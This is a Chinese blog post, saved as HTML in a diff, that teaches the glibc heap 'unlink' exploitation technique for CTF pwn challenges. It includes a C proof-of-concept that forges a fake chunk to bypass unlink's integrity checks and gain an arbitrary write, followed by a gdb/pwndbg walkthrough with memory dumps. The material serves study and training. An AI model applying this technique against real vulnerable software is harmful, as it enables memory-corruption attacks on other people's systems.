@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="unlink简介unlink的目的是把一个双向链表中的空闲块拿出来，如图。也就是12设置 P-&amp;gt;fd-&amp;gt;bk = P-&amp;gt;bk.设置 P-&amp;gt;bk-&amp;gt;fd = P-&amp;gt;fd. unlink时执行的检查以前的unlink是没有检查的，很容易利用，不过现在多了两项检查，所以在利用时候要绕过这些检查。    Function Security Check Error">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF pwn中的unlink">
+<meta property="og:url" content="http://eternalsakura13.com/2018/03/01/unlink1/index.html">
+<meta property="og:site_name" content="Sakuraのblog">
+<meta property="og:description" content="unlink简介unlink的目的是把一个双向链表中的空闲块拿出来，如图。也就是12设置 P-&amp;gt;fd-&amp;gt;bk = P-&amp;gt;bk.设置 P-&amp;gt;bk-&amp;gt;fd = P-&amp;gt;fd. unlink时执行的检查以前的unlink是没有检查的，很容易利用，不过现在多了两项检查，所以在利用时候要绕过这些检查。    Function Security Check Error">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-131218.jpg">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-173449.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-173700.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-173806.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-27-092353.jpg">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-135600.jpg">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-174334.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-144600.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-155409.png">
+<meta property="og:updated_time" content="2018-02-28T18:18:38.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF pwn中的unlink">
+<meta name="twitter:description" content="unlink简介unlink的目的是把一个双向链表中的空闲块拿出来，如图。也就是12设置 P-&amp;gt;fd-&amp;gt;bk = P-&amp;gt;bk.设置 P-&amp;gt;bk-&amp;gt;fd = P-&amp;gt;fd. unlink时执行的检查以前的unlink是没有检查的，很容易利用，不过现在多了两项检查，所以在利用时候要绕过这些检查。    Function Security Check Error">
+<meta name="twitter:image" content="http://onc55v8te.bkt.clouddn.com/2018-02-28-131218.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QOPH9ID41Z',
+      apiKey: '',
+      indexName: 'sakura',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eternalsakura13.com/2018/03/01/unlink1/"/>
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <title>CTF pwn中的unlink | Sakuraのblog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113420358-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sakuraのblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/03/01/unlink1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sakura">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sakuraのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF pwn中的unlink</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-01T00:59:01+08:00">
+                2018-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/堆利用/" itemprop="url" rel="index">
+                    <span itemprop="name">堆利用</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/03/01/unlink1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/03/01/unlink1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="unlink简介"><a href="#unlink简介" class="headerlink" title="unlink简介"></a>unlink简介</h2><p>unlink的目的是把一个双向链表中的空闲块拿出来，如图。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-131218.jpg" alt=""><br>也就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置 P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">设置 P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p>
+<h2 id="unlink时执行的检查"><a href="#unlink时执行的检查" class="headerlink" title="unlink时执行的检查"></a>unlink时执行的检查</h2><p>以前的unlink是没有检查的，很容易利用，不过现在多了两项检查，所以在利用时候要绕过这些检查。</p>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th style="text-align:right">Security Check</th>
+<th style="text-align:center">Error</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>unlink</td>
+<td style="text-align:right">chunk size是否等于next chunk(内存意义上的)的prev_size</td>
+<td style="text-align:center">corrupted size vs. prev_size</td>
+</tr>
+<tr>
+<td>unlink</td>
+<td style="text-align:right">检查是否P-&gt;fd-&gt;bk == P 以及 P-&gt;bk-&gt;fd == P</td>
+<td style="text-align:center">corrupted double-linked list</td>
+</tr>
+</tbody>
+</table>
+<h2 id="unlink-exploit"><a href="#unlink-exploit" class="headerlink" title="unlink exploit"></a>unlink exploit</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>通过一个例子来学习一下，这个例子是<a href="https://heap-exploitation.dhavalkapil.com" target="_blank" rel="noopener">Heap Exploitation系列</a>的unlink，为了便于理解，我会用gdb详细的调试一下。<br>首先，编译程序,我使用的系统是ubuntu14.04 64位，将下面的示例代码编译出来，带上-g参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gcc -g unlink.c -o unlink</span><br><span class="line">unlink.c: In function ‘main’:</span><br><span class="line">unlink.c:46:3: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long unsigned int’ [-Wformat=]</span><br><span class="line">   printf(&quot;%x\n&quot;, chunk1[3]);</span><br><span class="line">   ^</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>];               <span class="comment">// padding</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// First grab two chunks (non fast)</span></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Assuming attacker has control over chunk1's contents</span></span><br><span class="line">  <span class="comment">// Overflow the heap, override chunk2's header</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// First forge a fake chunk starting at chunk1</span></span><br><span class="line">  <span class="comment">// Need to setup fd and bk pointers to pass the unlink security check</span></span><br><span class="line">  fake_chunk = (struct chunk_structure *)chunk1;</span><br><span class="line">  fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br><span class="line">  fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Next modify the header of chunk2 to pass all security checks</span></span><br><span class="line">  chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">  chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">  chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'</span></span><br><span class="line">  <span class="comment">// This results in chunk1 pointer pointing to chunk1 - 3</span></span><br><span class="line">  <span class="comment">// i.e. chunk1[3] now contains chunk1 itself.</span></span><br><span class="line">  <span class="comment">// We then make chunk1 point to some victim's data</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  chunk1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)data;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite victim's data using chunk1</span></span><br><span class="line">  chunk1[<span class="number">0</span>] = <span class="number">0x002164656b636168</span>LL;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我使用了一个gdb插件pwndbg(应该是插件吧？)，需要安装的话。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></p>
+<p>开始调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 20</span><br><span class="line">Breakpoint 1 at 0x400695: file unlink.c, line 20.</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-173449.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p>
+<p>这样就开始malloc第一个chunk了，返回的地址放在rax里，然后存到栈里。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-173700.png" alt=""><br>继续看第二个chunk的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-173806.png" alt=""><br>接下来的三条命令其实就是输出我们刚刚调试出来的chunk地址的，所以过掉就行了，不过可以检查一下我们找的是不是对的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 25</span><br><span class="line">Breakpoint 2 at 0x4006f3: file unlink.c, line 25.</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">0x7fffffffdd60</span><br><span class="line">0x602010</span><br><span class="line">0x6020a0</span><br></pre></td></tr></table></figure></p>
+<p>然后来详细的说明一下，是怎么unlink exploit的。<br>假设攻击者已经控制了chunk1的数据，并且可以溢出到chunk2的元数据。<br>因为我们能够控制chunk1的数据，所以当然可以在chunk1里伪造一个chunk出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p>
+<p>我们知道，返回给我们的chunk实际上是mem指针,<strong>如下图的mem就是chunk1</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-27-092353.jpg" alt=""><br>通过将chunk1强制转换为struct chunk_structure结构体，就伪造出了一个chunk。<br>相当于<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-135600.jpg" alt=""><br>然后我们看一下此时的chunk1的内存。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
+<p>再看一下fake_chunk,地址为0xffffcf80，指向0x0804b008（mem)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-174334.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p $rbp<span class="number">-0x40</span></span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7fffffffdd70</span></span><br><span class="line">pwndbg&gt; x /x <span class="number">0x7fffffffdd70</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:	<span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="通过检查点1"><a href="#通过检查点1" class="headerlink" title="通过检查点1"></a>通过检查点1</h3><p><strong>接下来要确保chunk-&gt;fd-&gt;bk == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br></pre></td></tr></table></figure></p>
+<p>如果不熟悉指针加减运算的，可以参考<a href="http://c.biancheng.net/cpp/biancheng/view/47.html" target="_blank" rel="noopener">这篇文章</a><br>&amp;chunk1是指存放chunk1这个被分配出来的heap的地址的<strong>栈地址</strong>,即0x7fffffffdd60<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffdd60 —▸ 0x602010 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffdd68 —▸ 0x6020a0 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdd70 —▸ 0x602010 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffdd78 —▸ 0x40084d (__libc_csu_init+77) ◂— add    rbx, 1</span><br><span class="line">04:0020│      0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br><span class="line">05:0028│      0x7fffffffdd88 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd90 —▸ 0x400800 (__libc_csu_init) ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffdd98 ◂— 0xb7dbaa1d9dced400</span><br><span class="line">08:0040│      0x7fffffffdda0 —▸ 0x7fffffffde90 ◂— 0x1</span><br><span class="line">09:0048│      0x7fffffffdda8 ◂— 0x0</span><br></pre></td></tr></table></figure></p>
+<p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x00007fffffffdd48</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>接下来要确保chunk-&gt;bk-&gt;fd == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br></pre></td></tr></table></figure></p>
+<p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd	<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
+<p>我相信到这个时候你已经凌乱了,因为我一开始看到这里的时候也挺凌乱的（因为我指针学的不好emmm..)<br>让我们再理一下。</p>
+<p>首先观察一下栈段，我们知道我们的变量都是存在栈上的,chunk1,fake_chunk都是指针,指针的值都是一个表示地址空间中某个存储器单元的整数,这也就是我们说的<strong>指向</strong>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br></pre></td></tr></table></figure></p>
